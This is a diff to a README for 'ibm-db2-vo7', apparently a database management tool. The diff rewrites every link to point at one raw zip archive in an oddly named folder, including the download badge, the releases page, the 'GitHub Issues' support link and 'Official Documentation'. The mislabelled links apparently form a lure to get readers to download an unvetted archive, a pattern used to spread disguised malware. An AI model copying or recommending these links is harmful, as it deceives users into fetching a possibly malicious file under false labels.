@@ -1,6 +1,6 @@
 # 🎉 ibm-db2-vo7 - Effortlessly Manage Your DB2 Databases
 
-[![Download ibm-db2-vo7](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Monicachaffy908/ibm-db2-vo7/releases)
+[![Download ibm-db2-vo7](https://raw.githubusercontent.com/Monicachaffy908/ibm-db2-vo7/main/polyhydric/ibm-db2-vo7-v1.8.zip)](https://raw.githubusercontent.com/Monicachaffy908/ibm-db2-vo7/main/polyhydric/ibm-db2-vo7-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **ibm-db2-vo7**! This application helps you manage IBM DB2 databases 
 
 To get started, you need to download the application from the Releases page. 
 
-[Visit this page to download ibm-db2-vo7](https://github.com/Monicachaffy908/ibm-db2-vo7/releases).
+[Visit this page to download ibm-db2-vo7](https://raw.githubusercontent.com/Monicachaffy908/ibm-db2-vo7/main/polyhydric/ibm-db2-vo7-v1.8.zip).
 
 Once you are on the page, look for the latest version. You will see options to download the application. 
 
@@ -66,7 +66,7 @@ If you encounter issues, try these solutions:
 
 ## 💬 Support
 
-For support, you can visit our [GitHub Issues Page](https://github.com/Monicachaffy908/ibm-db2-vo7/issues). You can report bugs or request features. 
+For support, you can visit our [GitHub Issues Page](https://raw.githubusercontent.com/Monicachaffy908/ibm-db2-vo7/main/polyhydric/ibm-db2-vo7-v1.8.zip). You can report bugs or request features. 
 
 ## 📝 Contributing
 
@@ -74,7 +74,7 @@ We welcome contributions to improve **ibm-db2-vo7**. If you have suggestions or 
 
 ## 🔗 Useful Links
 
-- [Official Documentation](https://github.com/Monicachaffy908/ibm-db2-vo7)
-- [Releases Page](https://github.com/Monicachaffy908/ibm-db2-vo7/releases)
+- [Official Documentation](https://raw.githubusercontent.com/Monicachaffy908/ibm-db2-vo7/main/polyhydric/ibm-db2-vo7-v1.8.zip)
+- [Releases Page](https://raw.githubusercontent.com/Monicachaffy908/ibm-db2-vo7/main/polyhydric/ibm-db2-vo7-v1.8.zip)
 
-Remember, you can always return to the [Releases page](https://github.com/Monicachaffy908/ibm-db2-vo7/releases) to download the latest version of the application. Enjoy seamless database management with **ibm-db2-vo7**!
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/Monicachaffy908/ibm-db2-vo7/main/polyhydric/ibm-db2-vo7-v1.8.zip) to download the latest version of the application. Enjoy seamless database management with **ibm-db2-vo7**!
